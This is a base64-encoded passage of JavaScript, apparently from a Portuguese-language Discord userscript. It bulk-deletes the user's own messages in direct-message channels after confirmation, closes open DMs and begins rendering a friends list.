ZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBhcGlSZXF1ZXN0KHVybCk7CiAgICAgICAgICAgICAgICBpZiAocmVzcG9uc2Uub2spIHJldHVybiByZXNwb25zZS5qc29uKCk7CiAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgMTAwMDApKTsKICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgMTAwMDApKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH07CgogICAgY29uc3QgZGVsZXRlTWVzc2FnZSA9IGFzeW5jIChjaGFubmVsSWQsIG1lc3NhZ2VJZCkgPT4gewogICAgICAgIGxldCBlcnJvckNvdW50ID0gMDsKICAgICAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgY29uc3QgcmVzcG9uc2UgPSBhd2FpdCBhcGlSZXF1ZXN0KGBodHRwczovL2Rpc2NvcmQuY29tL2FwaS92OS9jaGFubmVscy8ke2NoYW5uZWxJZH0vbWVzc2FnZXMvJHttZXNzYWdlSWR9YCwgeyBtZXRob2Q6ICJERUxFVEUiIH0pOwogICAgICAgICAgICAgICAgaWYgKHJlc3BvbnNlLm9rKSByZXR1cm4gdHJ1ZTsKICAgICAgICAgICAgICAgIGlmIChyZXNwb25zZS5zdGF0dXMgPT09IDUwMDIxKSByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICBlcnJvckNvdW50Kys7CiAgICAgICAgICAgICAgICBpZiAoZXJyb3JDb3VudCA+PSAzKSByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgMTAwMDApKTsKICAgICAgICAgICAgfSBjYXRjaCB7CiAgICAgICAgICAgICAgICBlcnJvckNvdW50Kys7CiAgICAgICAgICAgICAgICBpZiAoZXJyb3JDb3VudCA+PSAzKSByZXR1cm4gZmFsc2U7CiAgICAgICAgICAgICAgICBhd2FpdCBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgMTAwMDApKTsKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH07CgogICAgY29uc3QgZGVsZXRlQWxsTWVzc2FnZXMgPSBhc3luYyAodXNlcklkLCB1c2VyTmFtZSkgPT4gewogICAgICAgIHNob3dDb25maXJtTW9kYWwoYFRlbSBjZXJ0ZXphIHF1ZSBkZXNlamEgYXBhZ2FyIFRPREFTIGFzIHN1YXMgbWVuc2FnZW5zIGNvbSAke3VzZXJOYW1lfT88YnI+PGJyPkVzc2EgYcOnw6NvIG7Do28gcG9kZSBzZXIgZGVzZmVpdGEhYCwgYXN5bmMgKCkgPT4gewogICAgICAgICAgICBjb25zdCBjYW5jZWxTdGF0ZSA9IHsgY2FuY2VsbGVkOiBmYWxzZSB9OwogICAgICAgICAgICBjb25zdCBwcm9ncmVzc01vZGFsID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgiZGl2Iik7CiAgICAgICAgICAgIHByb2dyZXNzTW9kYWwuY2xhc3NOYW1lID0gImRmbS1tb2RhbCI7CiAgICAgICAgICAgIHByb2dyZXNzTW9kYWwuaW5uZXJIVE1MID0gYAogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLWNvbnRlbnQiPgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1tb2RhbC10aXRsZSI+QXBhZ2FuZG8gTWVuc2FnZW5zPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy10ZXh0IiBpZD0icHJvZ3Jlc3MtdGV4dCI+RXNjYW5lYW5kbyBtZW5zYWdlbnMuLi48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhci1jb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWJhciIgaWQ9InByb2dyZXNzLWJhciI+PC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1hY3Rpb25zIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBjbGFzcz0iZGZtLWJ0bi1jYW5jZWwiIGlkPSJjYW5jZWwtb3BlcmF0aW9uIj5DYW5jZWxhcjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIGA7CiAgICAgICAgICAgIGRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NNb2RhbCk7CgogICAgICAgICAgICBjb25zdCBwcm9ncmVzc1RleHQgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNwcm9ncmVzcy10ZXh0Iik7CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzQmFyID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCIjcHJvZ3Jlc3MtYmFyIik7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbEJ0biA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI2NhbmNlbC1vcGVyYXRpb24iKTsKICAgICAgICAgICAgY2FuY2VsQnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gewogICAgICAgICAgICAgICAgY2FuY2VsU3RhdGUuY2FuY2VsbGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGNhbmNlbEJ0bi5kaXNhYmxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBjYW5jZWxCdG4udGV4dENvbnRlbnQgPSAiQ2FuY2VsYW5kby4uLiI7CiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgY29uc3QgY3VycmVudFVzZXJJZCA9IGdldEN1cnJlbnRVc2VySWQoKTsKICAgICAgICAgICAgY29uc3QgY2hhbm5lbElkID0gYXdhaXQgZ2V0Q2hhbm5lbElkKHVzZXJJZCk7CiAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2VJZHMgPSBbXTsKICAgICAgICAgICAgbGV0IGxhc3RNZXNzYWdlSWQgPSBudWxsOwoKICAgICAgICAgICAgd2hpbGUgKHRydWUpIHsKICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgY29uc3QgbWVzc2FnZXMgPSBhd2FpdCBmZXRjaE1lc3NhZ2VzKGNoYW5uZWxJZCwgbGFzdE1lc3NhZ2VJZCk7CiAgICAgICAgICAgICAgICBpZiAoIW1lc3NhZ2VzLmxlbmd0aCkgYnJlYWs7CiAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IG1zZyBvZiBtZXNzYWdlcykgewogICAgICAgICAgICAgICAgICAgIGlmIChtc2cuYXV0aG9yLmlkID09PSBjdXJyZW50VXNlcklkKSBtZXNzYWdlSWRzLnB1c2gobXNnLmlkKTsKICAgICAgICAgICAgICAgICAgICBsYXN0TWVzc2FnZUlkID0gbXNnLmlkOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYCR7bWVzc2FnZUlkcy5sZW5ndGh9IG1lbnNhZ2VucyBlbmNvbnRyYWRhcy4uLmA7CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIHsKICAgICAgICAgICAgICAgIHByb2dyZXNzTW9kYWwucmVtb3ZlKCk7CiAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCJPcGVyYcOnw6NvIGNhbmNlbGFkYSEiLCAid2FybmluZyIpOwogICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICB9CgogICAgICAgICAgICBpZiAoIW1lc3NhZ2VJZHMubGVuZ3RoKSB7CiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbigiTmVuaHVtYSBtZW5zYWdlbSBlbmNvbnRyYWRhIiwgImluZm8iKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgbGV0IGRlbGV0ZWRDb3VudCA9IDA7CiAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbWVzc2FnZUlkcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgYnJlYWs7CiAgICAgICAgICAgICAgICBpZiAoYXdhaXQgZGVsZXRlTWVzc2FnZShjaGFubmVsSWQsIG1lc3NhZ2VJZHNbaV0pKSBkZWxldGVkQ291bnQrKzsKICAgICAgICAgICAgICAgIGNvbnN0IHBlcmNlbnQgPSAoKGkgKyAxKSAvIG1lc3NhZ2VJZHMubGVuZ3RoKSAqIDEwMDsKICAgICAgICAgICAgICAgIHByb2dyZXNzVGV4dC50ZXh0Q29udGVudCA9IGBBcGFnYW5kbyAke2RlbGV0ZWRDb3VudH0vJHttZXNzYWdlSWRzLmxlbmd0aH0gbWVuc2FnZW5zYDsKICAgICAgICAgICAgICAgIHByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gYCR7cGVyY2VudH0lYDsKICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgQ2FuY2VsYWRvISAke2RlbGV0ZWRDb3VudH0gbWVuc2FnZW5zIGZvcmFtIGFwYWdhZGFzLmAsICJ3YXJuaW5nIik7CiAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKGAke2RlbGV0ZWRDb3VudH0gbWVuc2FnZW5zIGFwYWdhZGFzIWAsICJzdWNjZXNzIik7CiAgICAgICAgICAgIH0KICAgICAgICB9KTsKICAgIH07CgogICAgY29uc3QgZGVsZXRlTWVzc2FnZXNCeVVzZXJJZCA9IGFzeW5jIHVzZXJJZCA9PiB7CiAgICAgICAgaWYgKCF1c2VySWQ/LnRyaW0oKSkgewogICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCJEaWdpdGUgdW0gSUQgZGUgdXN1w6FyaW8gdsOhbGlkbyEiLCAid2FybmluZyIpOwogICAgICAgICAgICByZXR1cm47CiAgICAgICAgfQoKICAgICAgICBzaG93Q29uZmlybU1vZGFsKGBUZW0gY2VydGV6YSBxdWUgZGVzZWphIGFwYWdhciBUT0RBUyBhcyBzdWFzIG1lbnNhZ2VucyBjb20gbyB1c3XDoXJpbyBJRDogJHt1c2VySWR9Pzxicj48YnI+RXNzYSBhw6fDo28gbsOjbyBwb2RlIHNlciBkZXNmZWl0YSFgLCBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbFN0YXRlID0geyBjYW5jZWxsZWQ6IGZhbHNlIH07CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5jbGFzc05hbWUgPSAiZGZtLW1vZGFsIjsKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLXRpdGxlIj5BcGFnYW5kbyBNZW5zYWdlbnM8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLXRleHQiIGlkPSJwcm9ncmVzcy10ZXh0Ij5PYnRlbmRvIGNhbmFsLi4uPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1iYXItY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImRmbS1wcm9ncmVzcy1iYXIiIGlkPSJwcm9ncmVzcy1iYXIiPjwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtYWN0aW9ucyI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxidXR0b24gY2xhc3M9ImRmbS1idG4tY2FuY2VsIiBpZD0iY2FuY2VsLW9wZXJhdGlvbiI+Q2FuY2VsYXI8L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICBgOwogICAgICAgICAgICBkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKHByb2dyZXNzTW9kYWwpOwoKICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NUZXh0ID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCIjcHJvZ3Jlc3MtdGV4dCIpOwogICAgICAgICAgICBjb25zdCBwcm9ncmVzc0JhciA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI3Byb2dyZXNzLWJhciIpOwogICAgICAgICAgICBjb25zdCBjYW5jZWxCdG4gPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNjYW5jZWwtb3BlcmF0aW9uIik7CiAgICAgICAgICAgIGNhbmNlbEJ0bi5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsICgpID0+IHsKICAgICAgICAgICAgICAgIGNhbmNlbFN0YXRlLmNhbmNlbGxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBjYW5jZWxCdG4uZGlzYWJsZWQgPSB0cnVlOwogICAgICAgICAgICAgICAgY2FuY2VsQnRuLnRleHRDb250ZW50ID0gIkNhbmNlbGFuZG8uLi4iOwogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBjb25zdCBjdXJyZW50VXNlcklkID0gZ2V0Q3VycmVudFVzZXJJZCgpOwogICAgICAgICAgICAgICAgY29uc3QgY2hhbm5lbElkID0gYXdhaXQgZ2V0Q2hhbm5lbElkKHVzZXJJZC50cmltKCkpOwoKICAgICAgICAgICAgICAgIGlmICghY2hhbm5lbElkKSB7CiAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCJOw6NvIGZvaSBwb3Nzw612ZWwgZW5jb250cmFyIGEgY29udmVyc2EgY29tIGVzdGUgdXN1w6FyaW8iLCAiZXJyb3IiKTsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gIkVzY2FuZWFuZG8gbWVuc2FnZW5zLi4uIjsKICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2VJZHMgPSBbXTsKICAgICAgICAgICAgICAgIGxldCBsYXN0TWVzc2FnZUlkID0gbnVsbDsKCiAgICAgICAgICAgICAgICB3aGlsZSAodHJ1ZSkgewogICAgICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IG1lc3NhZ2VzID0gYXdhaXQgZmV0Y2hNZXNzYWdlcyhjaGFubmVsSWQsIGxhc3RNZXNzYWdlSWQpOwogICAgICAgICAgICAgICAgICAgIGlmICghbWVzc2FnZXMubGVuZ3RoKSBicmVhazsKICAgICAgICAgICAgICAgICAgICBmb3IgKGNvbnN0IG1zZyBvZiBtZXNzYWdlcykgewogICAgICAgICAgICAgICAgICAgICAgICBpZiAobXNnLmF1dGhvci5pZCA9PT0gY3VycmVudFVzZXJJZCkgbWVzc2FnZUlkcy5wdXNoKG1zZy5pZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxhc3RNZXNzYWdlSWQgPSBtc2cuaWQ7CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIHByb2dyZXNzVGV4dC50ZXh0Q29udGVudCA9IGAke21lc3NhZ2VJZHMubGVuZ3RofSBtZW5zYWdlbnMgZW5jb250cmFkYXMuLi5gOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIHsKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oIk9wZXJhw6fDo28gY2FuY2VsYWRhISIsICJ3YXJuaW5nIik7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICghbWVzc2FnZUlkcy5sZW5ndGgpIHsKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oIk5lbmh1bWEgbWVuc2FnZW0gc3VhIGVuY29udHJhZGEgbmVzdGEgY29udmVyc2EiLCAiaW5mbyIpOwogICAgICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBsZXQgZGVsZXRlZENvdW50ID0gMDsKICAgICAgICAgICAgICAgIGZvciAobGV0IGkgPSAwOyBpIDwgbWVzc2FnZUlkcy5sZW5ndGg7IGkrKykgewogICAgICAgICAgICAgICAgICAgIGlmIChjYW5jZWxTdGF0ZS5jYW5jZWxsZWQpIGJyZWFrOwogICAgICAgICAgICAgICAgICAgIGlmIChhd2FpdCBkZWxldGVNZXNzYWdlKGNoYW5uZWxJZCwgbWVzc2FnZUlkc1tpXSkpIGRlbGV0ZWRDb3VudCsrOwogICAgICAgICAgICAgICAgICAgIGNvbnN0IHBlcmNlbnQgPSAoKGkgKyAxKSAvIG1lc3NhZ2VJZHMubGVuZ3RoKSAqIDEwMDsKICAgICAgICAgICAgICAgICAgICBwcm9ncmVzc1RleHQudGV4dENvbnRlbnQgPSBgQXBhZ2FuZG8gJHtkZWxldGVkQ291bnR9LyR7bWVzc2FnZUlkcy5sZW5ndGh9IG1lbnNhZ2Vuc2A7CiAgICAgICAgICAgICAgICAgICAgcHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGggPSBgJHtwZXJjZW50fSVgOwogICAgICAgICAgICAgICAgICAgIGF3YWl0IG5ldyBQcm9taXNlKHIgPT4gc2V0VGltZW91dChyLCByZXF1ZXN0RGVsYXkpKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcm9ncmVzc01vZGFsLnJlbW92ZSgpOwogICAgICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYENhbmNlbGFkbyEgJHtkZWxldGVkQ291bnR9IG1lbnNhZ2VucyBmb3JhbSBhcGFnYWRhcy5gLCAid2FybmluZyIpOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKGAke2RlbGV0ZWRDb3VudH0gbWVuc2FnZW5zIGFwYWdhZGFzIWAsICJzdWNjZXNzIik7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0gY2F0Y2ggewogICAgICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oIkVycm8gYW8gZGVsZXRhciBtZW5zYWdlbnMiLCAiZXJyb3IiKTsKICAgICAgICAgICAgfQogICAgICAgIH0pOwogICAgfTsKCiAgICBjb25zdCBjbG9zZUFsbERNcyA9IGFzeW5jICgpID0+IHsKICAgICAgICBjb25zdCBpbml0aWFsQnV0dG9ucyA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ1thcmlhLWxhYmVsPSJGZWNoYXIgbWVuc2FnZW0gZGlyZXRhIl0nKTsKICAgICAgICBpZiAoIWluaXRpYWxCdXR0b25zLmxlbmd0aCkgewogICAgICAgICAgICBzaG93Tm90aWZpY2F0aW9uKCJOZW5odW1hIERNIGFiZXJ0YSBlbmNvbnRyYWRhISIsICJ3YXJuaW5nIik7CiAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIHNob3dDb25maXJtTW9kYWwoYFRlbSBjZXJ0ZXphIHF1ZSBkZXNlamEgRkVDSEFSIHRvZGFzIGFzIERNcyBhYmVydGFzPzxicj48YnI+SXNzbyBuw6NvIGFwYWdhIGFzIG1lbnNhZ2VucywgYXBlbmFzIGZlY2hhIG9zIGNhbmFpcyBkZSBjb252ZXJzYS5gLCBhc3luYyAoKSA9PiB7CiAgICAgICAgICAgIGNvbnN0IGNhbmNlbFN0YXRlID0geyBjYW5jZWxsZWQ6IGZhbHNlIH07CiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzTW9kYWwgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJkaXYiKTsKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5jbGFzc05hbWUgPSAiZGZtLW1vZGFsIjsKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5pbm5lckhUTUwgPSBgCiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tbW9kYWwtY29udGVudCI+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLW1vZGFsLXRpdGxlIj5GZWNoYW5kbyBETXM8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLXRleHQiIGlkPSJwcm9ncmVzcy10ZXh0Ij4wIERNcyBmZWNoYWRhczwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtYmFyLWNvbnRhaW5lciI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJkZm0tcHJvZ3Jlc3MtYmFyIiBpZD0icHJvZ3Jlc3MtYmFyIiBzdHlsZT0id2lkdGg6IDAlIj48L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iZGZtLXByb2dyZXNzLWFjdGlvbnMiPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIGNsYXNzPSJkZm0tYnRuLWNhbmNlbCIgaWQ9ImNhbmNlbC1vcGVyYXRpb24iPkNhbmNlbGFyPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgYDsKICAgICAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChwcm9ncmVzc01vZGFsKTsKCiAgICAgICAgICAgIGNvbnN0IHByb2dyZXNzVGV4dCA9IHByb2dyZXNzTW9kYWwucXVlcnlTZWxlY3RvcigiI3Byb2dyZXNzLXRleHQiKTsKICAgICAgICAgICAgY29uc3QgcHJvZ3Jlc3NCYXIgPSBwcm9ncmVzc01vZGFsLnF1ZXJ5U2VsZWN0b3IoIiNwcm9ncmVzcy1iYXIiKTsKICAgICAgICAgICAgY29uc3QgY2FuY2VsQnRuID0gcHJvZ3Jlc3NNb2RhbC5xdWVyeVNlbGVjdG9yKCIjY2FuY2VsLW9wZXJhdGlvbiIpOwoKICAgICAgICAgICAgY2FuY2VsQnRuLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgKCkgPT4gewogICAgICAgICAgICAgICAgY2FuY2VsU3RhdGUuY2FuY2VsbGVkID0gdHJ1ZTsKICAgICAgICAgICAgICAgIGNhbmNlbEJ0bi5kaXNhYmxlZCA9IHRydWU7CiAgICAgICAgICAgICAgICBjYW5jZWxCdG4udGV4dENvbnRlbnQgPSAiQ2FuY2VsYW5kby4uLiI7CiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgbGV0IGNsb3NlZENvdW50ID0gMDsKICAgICAgICAgICAgY29uc3QgZGVsYXkgPSBtcyA9PiBuZXcgUHJvbWlzZShyID0+IHNldFRpbWVvdXQociwgbXMpKTsKCiAgICAgICAgICAgIHdoaWxlICh0cnVlKSB7CiAgICAgICAgICAgICAgICBpZiAoY2FuY2VsU3RhdGUuY2FuY2VsbGVkKSBicmVhazsKCiAgICAgICAgICAgICAgICBjb25zdCBjbG9zZUJ1dHRvbnMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdbYXJpYS1sYWJlbD0iRmVjaGFyIG1lbnNhZ2VtIGRpcmV0YSJdJyk7CiAgICAgICAgICAgICAgICBpZiAoIWNsb3NlQnV0dG9ucy5sZW5ndGgpIGJyZWFrOwoKICAgICAgICAgICAgICAgIGNsb3NlQnV0dG9uc1swXS5jbGljaygpOwogICAgICAgICAgICAgICAgYXdhaXQgZGVsYXkoMzAwKTsKCiAgICAgICAgICAgICAgICBjb25zdCBjYW5jZWxCdXR0b24gPSBbLi4uZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnYnV0dG9uJyldLmZpbmQoYiA9PiBiLnRleHRDb250ZW50LnRyaW0oKSA9PT0gJ0NhbmNlbGFyJyk7CiAgICAgICAgICAgICAgICBpZiAoY2FuY2VsQnV0dG9uKSB7CiAgICAgICAgICAgICAgICAgICAgY2FuY2VsQnV0dG9uLmNsaWNrKCk7CiAgICAgICAgICAgICAgICAgICAgYXdhaXQgZGVsYXkoMzAwKTsKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBjbG9zZWRDb3VudCsrOwogICAgICAgICAgICAgICAgcHJvZ3Jlc3NUZXh0LnRleHRDb250ZW50ID0gYCR7Y2xvc2VkQ291bnR9IERNcyBmZWNoYWRhc2A7CiAgICAgICAgICAgICAgICBwcm9ncmVzc0Jhci5zdHlsZS53aWR0aCA9ICIxMDAlIjsKICAgICAgICAgICAgfQoKICAgICAgICAgICAgcHJvZ3Jlc3NNb2RhbC5yZW1vdmUoKTsKICAgICAgICAgICAgaWYgKGNhbmNlbFN0YXRlLmNhbmNlbGxlZCkgewogICAgICAgICAgICAgICAgc2hvd05vdGlmaWNhdGlvbihgQ2FuY2VsYWRvISAke2Nsb3NlZENvdW50fSBETXMgZm9yYW0gZmVjaGFkYXMuYCwgIndhcm5pbmciKTsKICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgIHNob3dOb3RpZmljYXRpb24oYCR7Y2xvc2VkQ291bnR9IERNcyBmZWNoYWRhcyBjb20gc3VjZXNzbyFgLCAic3VjY2VzcyIpOwogICAgICAgICAgICB9CiAgICAgICAgfSk7CiAgICB9OwoKICAgIGNvbnN0IGZpbHRlckl0ZW1zID0gKGl0ZW1zLCBzZWFyY2hUZXJtKSA9PiBzZWFyY2hUZXJtID8gaXRlbXMuZmlsdGVyKGl0ZW0gPT4gaXRlbS5uYW1lLnRvTG93ZXJDYXNlKCkuaW5jbHVkZXMoc2VhcmNoVGVybS50b0xvd2VyQ2FzZSgpKSkgOiBpdGVtczsKCiAgICBjb25zdCByZW5kZXJGcmllbmRzID0gKGZyaWVuZHMsIHNlYXJjaFRlcm0gPSAiIikgPT4gewogICAgICAgIGNvbnN0IGNvbnRlbnQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZnJpZW5kcy10YWIiKTsKICAgICAgICBjb25zdCBmaWx0ZXJlZEZyaWVuZHMgPSBmaWx0ZXJJdGVtcyhmcmllbmRzLm1hcChmID0+ICh7IC4uLmYsIG5hbWU6IGYudXNlci5nbG9iYWxfbmFtZSB8fCBmLnVzZXIudXNlcm5hbWUgfSkpLCBzZWFyY2hUZXJtKTsKCiAgICAgICAgaWYgKCFmaWx0ZXJlZEZyaWVuZHMubGV